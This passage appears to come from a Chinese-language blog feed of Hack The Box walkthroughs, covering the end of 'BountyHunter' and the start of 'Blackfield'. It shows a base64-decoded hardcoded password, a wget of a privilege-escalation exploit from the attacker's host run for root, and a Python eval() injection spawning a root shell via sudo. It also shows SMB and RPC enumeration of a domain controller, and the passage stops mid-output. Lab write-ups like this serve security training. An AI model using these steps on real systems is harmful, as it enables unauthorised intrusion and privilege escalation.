class="hljs-built_in">tr</span>&gt;<br>    &lt;td&gt;CWE:&lt;/td&gt;<br>    &lt;td&gt;cwe&lt;/td&gt;<br>  &lt;/tr&gt;<br>  &lt;<span class="hljs-built_in">tr</span>&gt;<br>    &lt;td&gt;Score:&lt;/td&gt;<br>    &lt;td&gt;sadsdsa&lt;/td&gt;<br>  &lt;/tr&gt;<br>  &lt;<span class="hljs-built_in">tr</span>&gt;<br>    &lt;td&gt;Reward:&lt;/td&gt;<br>    &lt;td&gt;100000&lt;/td&gt;<br>  &lt;/tr&gt;<br>&lt;/table&gt;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; <span class="hljs-built_in">echo</span> PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=|<span class="hljs-built_in">base64</span> -d<br>&lt;?php<br>// TODO -&gt; Implement login system with the database.<br><span class="hljs-variable">$dbserver</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;bounty&quot;</span>;<br><span class="hljs-variable">$dbusername</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br><span class="hljs-variable">$dbpassword</span> = <span class="hljs-string">&quot;m19RoAU0hP41A1sTsq6K&quot;</span>;<br><span class="hljs-variable">$testuser</span> = <span class="hljs-string">&quot;test&quot;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; ssh development@10.10.11.100          <br>The authenticity of host <span class="hljs-string">&#x27;10.10.11.100 (10.10.11.100)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:p7RCN4B2AtB69d0vE1LTmg0lRRlnsR1fxArJ+KNoNFQ.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.11.100<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">development@10.10.11.100&#x27;</span>s password: <br>Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)<br>development@bountyhunter:~$ <span class="hljs-built_in">cat</span> user.txt <br><span class="hljs-built_in">cd</span>........................................<br></code></pre></td></tr></table></figure><h4 id="Elevated-privileges-number-one"><a href="#Elevated-privileges-number-one" class="headerlink" title="Elevated privileges number one:"></a>Elevated privileges number one:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">development@bountyhunter:~$ wget http://10.10.16.7/CVE-2021-2043.py<br>--2022-05-17 10:03:41--  http://10.10.16.7/CVE-2021-2043.py<br>Connecting to 10.10.16.7:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 3448 (3.4K) [text/x-python]<br>Saving to: ‘CVE-2021-2043.py’<br><br>CVE-2021-2043.py                    100%[=================================================================&gt;]   3.37K  --.-KB/s    <span class="hljs-keyword">in</span> 0.1s    <br><br>2022-05-17 10:03:42 (22.6 KB/s) - ‘CVE-2021-2043.py’ saved [3448/3448]<br><br>development@bountyhunter:~$ <span class="hljs-built_in">chmod</span> +x ./CVE-2021-2043.py <br>development@bountyhunter:~$ ./CVE-2021-2043.py <br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),1000(development)<br></code></pre></td></tr></table></figure><h4 id="Elevated-privileges-number-two"><a href="#Elevated-privileges-number-two" class="headerlink" title="Elevated privileges number two:"></a>Elevated privileges number two:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">development@bountyhunter:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> development on bountyhunter:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User development may run the following commands on bountyhunter:<br>    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python">development@bountyhunter:/opt/skytrain_inc$ cat ticketValidator.py <br><span class="hljs-comment">#Skytrain Inc Ticket Validation System 0.1</span><br><span class="hljs-comment">#Do not distribute this file.</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_file</span>(<span class="hljs-params">loc</span>):<br>    <span class="hljs-keyword">if</span> loc.endswith(<span class="hljs-string">&quot;.md&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(loc, <span class="hljs-string">&#x27;r&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Wrong file type.&quot;</span>)<br>        exit()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate</span>(<span class="hljs-params">ticketFile</span>):<br>    <span class="hljs-comment">#Evaluates a ticket to check for ireggularities.</span><br>    code_line = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> i,x <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(ticketFile.readlines()):<br>        <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> x.startswith(<span class="hljs-string">&quot;# Skytrain Inc&quot;</span>):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> i == <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> x.startswith(<span class="hljs-string">&quot;## Ticket to &quot;</span>):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Destination: <span class="hljs-subst">&#123;<span class="hljs-string">&#x27; &#x27;</span>.join(x.strip().split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">3</span>:])&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> x.startswith(<span class="hljs-string">&quot;__Ticket Code:__&quot;</span>):<br>            code_line = i+<span class="hljs-number">1</span><br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> code_line <span class="hljs-keyword">and</span> i == code_line:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> x.startswith(<span class="hljs-string">&quot;**&quot;</span>):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            ticketCode = x.replace(<span class="hljs-string">&quot;**&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).split(<span class="hljs-string">&quot;+&quot;</span>)[<span class="hljs-number">0</span>]<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(ticketCode) % <span class="hljs-number">7</span> == <span class="hljs-number">4</span>:<br>                validationNumber = <span class="hljs-built_in">eval</span>(x.replace(<span class="hljs-string">&quot;**&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>                <span class="hljs-keyword">if</span> validationNumber &gt; <span class="hljs-number">100</span>:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    fileName = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Please enter the path to the ticket file.\n&quot;</span>)<br>    ticket = load_file(fileName)<br>    <span class="hljs-comment">#DEBUG print(ticket)</span><br>    result = evaluate(ticket)<br>    <span class="hljs-keyword">if</span> (result):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Valid ticket.&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid ticket.&quot;</span>)<br>    ticket.close<br><br>main()<br></code></pre></td></tr></table></figure><p>这个脚本看起来在判断读取的<strong>ticket</strong>变量，而<strong>ticket</strong>变量是从.md文件中读出来的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">development@bountyhunter:/opt/skytrain_inc$ <span class="hljs-built_in">ls</span><br>invalid_tickets  ticketValidator.py<br>development@bountyhunter:/opt/skytrain_inc$ <span class="hljs-built_in">cd</span> invalid_tickets/<br>development@bountyhunter:/opt/skytrain_inc/invalid_tickets$ <span class="hljs-built_in">ls</span><br>390681613.md  529582686.md  600939065.md  734485704.md<br>development@bountyhunter:/opt/skytrain_inc/invalid_tickets$ <span class="hljs-built_in">cat</span> 390681613.md <br><span class="hljs-comment"># Skytrain Inc</span><br><span class="hljs-comment">## Ticket to New Haven</span><br>__Ticket Code:__<br>**31+410+86**<br><span class="hljs-comment">##Issued: 2021/04/06</span><br><span class="hljs-comment">#End Ticket</span><br>development@bountyhunter:/opt/skytrain_inc/invalid_tickets$ <span class="hljs-built_in">cat</span> 529582686.md <br><span class="hljs-comment"># Skytrain Inc</span><br><span class="hljs-comment">## Ticket to Bridgeport</span><br>**32+110+43**<br><span class="hljs-comment">##Issued: 2021/04/06</span><br><span class="hljs-comment">#End Ticket</span><br>development@bountyhunter:/opt/skytrain_inc/invalid_tickets$ <br></code></pre></td></tr></table></figure><p>好像在做加法运算？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">development@bountyhunter:/opt/skytrain_inc$ python3 ticketValidator.py<br>Please enter the path to the ticket file.<br>invalid_tickets/529582686.md<br>Destination: Bridgeport<br>Invalid ticket.<br>development@bountyhunter:/opt/skytrain_inc$ python3 ticketValidator.py<br>Please enter the path to the ticket file.<br>/opt/skytrain_inc/invalid_tickets/529582686.md <br>Destination: Bridgeport<br>Invalid ticket.<br>development@bountyhunter:/opt/skytrain_inc$ <br></code></pre></td></tr></table></figure><p>读取票据什么也不执行，只显示票据有效无效，再看代码只要除以7余4，并且大于100就会返回给main函数提示有效票据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(ticketCode) % <span class="hljs-number">7</span> == <span class="hljs-number">4</span>:<br>    validationNumber = <span class="hljs-built_in">eval</span>(x.replace(<span class="hljs-string">&quot;**&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    <span class="hljs-keyword">if</span> validationNumber &gt; <span class="hljs-number">100</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><p>eval函数看起来没什么过滤：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Skytrain Inc</span><br><span class="hljs-comment">## Ticket to Bridgeport</span><br>__Ticket Code:__<br>**<span class="hljs-number">32</span>+<span class="hljs-number">110</span>+<span class="hljs-number">44</span>+<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;bash&#x27;</span>)**<br><span class="hljs-comment">##Issued: 2021/04/06</span><br><span class="hljs-comment">#End Ticket</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">development@bountyhunter:/opt/skytrain_inc$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py <br>Please enter the path to the ticket file.<br>/home/development/test.md<br>Destination: Bridgeport<br>root@bountyhunter:/opt/skytrain_inc<span class="hljs-comment"># cat /root/root.txt </span><br>1e.....................................<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Blackfield</title>
    <link href="/post/HackTheBox-Blackfield.html"/>
    <url>/post/HackTheBox-Blackfield.html</url>
    
    <content type="html"><![CDATA[<h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92 scan initiated Fri Apr 22 22:52:15 2022 as: nmap -sC -sV -T4 -Pn -p- -oA nmap.txt 10.10.10.192</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.192<br>Host is up (0.26s latency).<br>Not shown: 65526 filtered tcp ports (no-response)<br>PORT      STATE SERVICE       VERSION<br>53/tcp    open  domain        Simple DNS Plus<br>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-22 22:03:34Z)<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)<br>445/tcp   open  microsoft-ds?<br>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)<br>49676/tcp open  msrpc         Microsoft Windows RPC<br>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>|_clock-skew: 7h00m00s<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-04-22T22:04:30<br>|_  start_date: N/A<br>| smb2-security-mode: <br>|   3.1.1: <br>|_    Message signing enabled and required<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br><span class="hljs-comment"># Nmap done at Fri Apr 22 23:05:14 2022 -- 1 IP address (1 host up) scanned in 778.49 seconds</span><br></code></pre></td></tr></table></figure><h4 id="DNS："><a href="#DNS：" class="headerlink" title="DNS："></a>DNS：</h4><p>Nmap为我枚举到了一些端口信息，还有一个域，正如该靶机的名字一样，BLACKFIELD.local0，为什么后边有个0，我可以试着去验证一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ dig 10.10.10.192 BLACKFIELD.<span class="hljs-built_in">local</span> <br><br>; &lt;&lt;&gt;&gt; DiG 9.18.0-2-Debian &lt;&lt;&gt;&gt; 10.10.10.192 BLACKFIELD.<span class="hljs-built_in">local</span><br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NXDOMAIN, id: 22432</span><br><span class="hljs-string">;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; OPT PSEUDOSECTION:</span><br><span class="hljs-string">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;10.10.10.192.                  IN      A</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 4 msec</span><br><span class="hljs-string">;; SERVER: 192.168.1.1#53(192.168.1.1) (UDP)</span><br><span class="hljs-string">;; WHEN: Fri Apr 22 23:09:27 CST 2022</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 41</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Got answer:</span><br><span class="hljs-string">;; WARNING: .local is reserved for Multicast DNS</span><br><span class="hljs-string">;; You are currently testing what happens when an mDNS query is leaked to DNS</span><br><span class="hljs-string">;; -&gt;&gt;HEADER&lt;&lt;- opcode</span>: QUERY, status: NXDOMAIN, <span class="hljs-built_in">id</span>: 39765<br>;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1<br><br>;; OPT PSEUDOSECTION:<br>; EDNS: version: 0, flags:; udp: 4096<br>; COOKIE: 84e1372c44b5b53c7103d16d6262c57586faa8e2fe3ccbf5 (good)<br>;; QUESTION SECTION:<br>;BLACKFIELD.<span class="hljs-built_in">local</span>.              IN      A<br><br>;; AUTHORITY SECTION:<br>.                       1800    IN      SOA     a.root-servers.net. nstld.verisign-grs.com. 2022042200 1800 900 604800 86400<br><br>;; Query time: 24 msec<br>;; SERVER: 192.168.1.1<span class="hljs-comment">#53(192.168.1.1) (UDP)</span><br>;; WHEN: Fri Apr 22 23:09:27 CST 2022<br>;; MSG SIZE  rcvd: 148<br></code></pre></td></tr></table></figure><p>88kerberos枚举能供我参考的信息太少，暂时先不考虑吧，我觉得当下收集更多的用户信息会更有帮助：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ rpcclient -U <span class="hljs-string">&quot;&quot;</span> 10.10.10.192  -N<br>rpcclient $&gt; enumdomusers<br>result was NT_STATUS_ACCESS_DENIED<br>rpcclient $&gt; <br></code></pre></td></tr></table></figure><p>好吧RPC也不行。</p><h4 id="SMB："><a href="#SMB：" class="headerlink" title="SMB："></a>SMB：</h4><p>Crackmapexec 是一种后期利用工具，可帮助自动执行一些任务，例如密码喷洒、枚举共享、验证本地管理员访问权限、在目标机器上执行命令等等。默认情况下它会识别操作系统、主机名、域名、SMB 版本以及是否启用了 SMB 签名。kalinux默认集成：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crackmapexec smb 10.10.10.192<br>SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.<span class="hljs-built_in">local</span>) (signing:True) (SMBv1:False)<br></code></pre></td></tr></table></figure><p>Windows 10.0 Build 17763 x64是windows2019系统。我可以查看一些smb共享信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient -N -L //10.10.10.192   <br><br>        Sharename       Type      Comment<br>        ---------       ----      -------<br>        ADMIN$          Disk      Remote Admin<br>        C$              Disk      Default share<br>        forensic        Disk      Forensic / Audit share.<br>        IPC$            IPC       Remote IPC<br>        NETLOGON        Disk      Logon server share <br>        profiles$       Disk      <br>        SYSVOL          Disk      Logon server share <br>Reconnecting with SMB1 <span class="hljs-keyword">for</span> workgroup listing.<br>do_connect: Connection to 10.10.10.192 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br>Unable to connect with SMB1 -- no workgroup available<br></code></pre></td></tr></table></figure><p>看起来它并不希望我访问一些默认共享：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient //10.10.10.192/NETLOGON<br>Enter WORKGROUP\worldisend<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string">smb: \&gt; dir</span><br><span class="hljs-string">NT_STATUS_ACCESS_DENIED listing \*</span><br><span class="hljs-string">smb: \&gt; exit</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient //10.10.10.192/SYSVOL  <br>Enter WORKGROUP\worldisend<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string">smb: \&gt; DIR</span><br><span class="hljs-string">NT_STATUS_ACCESS_DENIED listing \*</span><br><span class="hljs-string">smb: \&gt; dir</span><br><span class="hljs-string">NT_STATUS_ACCESS_DENIED listing \*</span><br><span class="hljs-string">smb: \&gt; </span><br></code></pre></td></tr></table></figure><p>那非默认的smb共享，只有一个forensic和profiles$：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient //10.10.10.192/forensic<br>Enter WORKGROUP\worldisend<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string">smb: \&gt; dir</span><br><span class="hljs-string">NT_STATUS_ACCESS_DENIED listing \*</span><br><span class="hljs-string">smb: \&gt; ls</span><br><span class="hljs-string">NT_STATUS_ACCESS_DENIED listing \*</span><br><span class="hljs-string">smb: \&gt; ^C</span><br></code></pre></td></tr></table></figure><p>forensic我暂时也访问不了，profiles$倒是允许我访问，但是它似乎过于热情了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ smbclient //10.10.10.192/profiles$<br>Enter WORKGROUP\worldisend<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="hljs-string">smb: \&gt; dir</span><br><span class="hljs-string">  .                                   D        0  Thu Jun  4 00:47:12 2020</span><br><span class="hljs-string">  ..                                  D        0  Thu Jun  4 00:47:12 2020</span><br><span class="hljs-string">  AAlleni                             D        0  Thu Jun  4 00:47:11 2020</span><br><span class="hljs-string">  ABarteski                           D        0  Thu Jun  4 00:47:11 2020</span><br><span class="hljs-string">  ABekesz                             D        0  Thu Jun  4 00:47:11 2020</span><br><span class="hljs-string">  ABenzies                            D        0  Thu Jun  4 00:47:11 2020</span><br><span class="hljs-string">  ABiemiller                          D        0  Thu Jun  4 00:47:11 2020</span><br><span class="hljs-string">  AChampken                           D        0  Thu Jun  4 00:47:11 2020</span><br><span class="hljs-string">  ACheretei                           D        0  Thu Jun  4 00:47:11 2020</span><br><span class="hljs-string">  ACsonaki                            D        0  Thu Jun  4 00:47:11 2020</span><br><span class="hljs-string">  AHigchens                           D        0  Thu Jun  4 00:47:11 2020</span><br><span class="hljs-string">  AJaquemai                           D        0  Thu Jun  4 00:47:11 2020</span><br><span class="hljs-string">  AKlado                              D        0  Thu Jun  4 00:47:11 2020</span><br><span class="hljs-string">  AKoffenburger                       D        0  Thu Jun  4 00:47:11 2020</span><br><span class="hljs-string">  AKollolli                           D        0  Thu Jun  4 00:47:11 2020</span><br><span class="hljs-string">  BLostal                             D        0  Thu Jun  4 00:47:11 2020</span><br><span class="hljs-string"> ....................</span><br><span class="hljs-string"></span><br><span class="hljs-string">                5102079 blocks of size 4096. 1683487 blocks available</span><br><span class="hljs-string">smb: \&gt; </span><br></code></pre></td></tr></table></figure><p>但是这些目录中都是空的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">smb: \&gt; <span class="hljs-built_in">cd</span> ZWausik\<br>smb: \ZWausik\&gt; s<br>s: <span class="hljs-built_in">command</span> abbreviation ambiguous<br>smb: \ZWausik\&gt; <span class="hljs-built_in">dir</span><br>  .                                   D        0  